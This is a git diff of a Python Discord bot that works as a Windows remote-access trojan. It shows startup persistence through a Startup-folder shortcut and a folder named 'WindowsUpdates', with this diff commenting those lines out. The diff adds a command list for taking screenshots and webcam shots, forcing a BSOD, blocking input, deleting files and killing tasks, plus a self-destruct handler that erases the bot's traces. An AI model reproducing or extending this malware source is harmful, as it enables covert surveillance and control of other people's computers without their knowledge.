@@ -2,7 +2,7 @@ import discord
 import os
 import libs.computer as pc
 import libs.powershell as pw
-from shutil import copy
+from shutil import copy;
 import winshell
 from win32com.client import Dispatch
 
@@ -13,16 +13,17 @@ from win32com.client import Dispatch
 
 modules_path = os.getcwd() + "\modules"
 client = discord.Client(intents=discord.Intents.all())
-boot_path = os.getenv("APPDATA") + "\Microsoft\Windows\Start Menu\Programs\Startup"
+#boot_path = os.getenv("APPDATA") + "\Microsoft\Windows\Start Menu\Programs\Startup"
 
 def load_modules():
     for module in os.listdir(modules_path):
         if module.endswith(".py"):
             os.popen(f"py {modules_path}/{module}")
-    
+
 @client.event
 async def on_ready():
     print(f"Bot started.")
+    """
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
     if os.path.exists(f"{boot_path}\Run.lnk") == False:
@@ -32,11 +33,46 @@ async def on_ready():
         shortcut.Targetpath = target
         shortcut.WorkingDirectory = target
         shortcut.save()
+    """
 
 @client.event
 async def on_message(message):
     if message.author == client.user:
         return
+
+    #HELP
+    if message.content.startswith(".help"):
+        await message.delete()
+        commandlist = """
+            .help - Get command list
+            .pcinfo - Get computer information
+            .shutdown - Shutdown computer
+            .hardware - Get hardware information
+            .dir - Get directory
+            .tasklist - Get tasklist
+            .taskkill - Kill task
+            .screenshot - Take screenshot
+            .copy - Copy file
+            .bsod - BSOD
+            .webcam - Take webcamshot
+            .logout - Logout
+            .delete - Delete file
+            .blockinput - Block input
+            .unblockinput - Unblock input
+            .selfdestruct - Deletes all traces of the bot
+        """
+        embed = discord.Embed(title="Command list", description=commandlist)
+        await message.channel.send(embed=embed)
+
+    #SELF DESTRUCT
+    if message.content.startswith(".selfdestruct"):
+        await message.delete()
+        embed = discord.Embed(title="Self Destruct", description="Attempting to self destruct...")
+        await message.channel.send(embed=embed)
+        pc.self_destruct()
+        embed = discord.Embed(title="Self Destruct successful")
+        await message.channel.send(embed=embed)
+        quit()
 
     #COMPUTER INFORMATION
     if message.content.startswith(".pcinfo"):
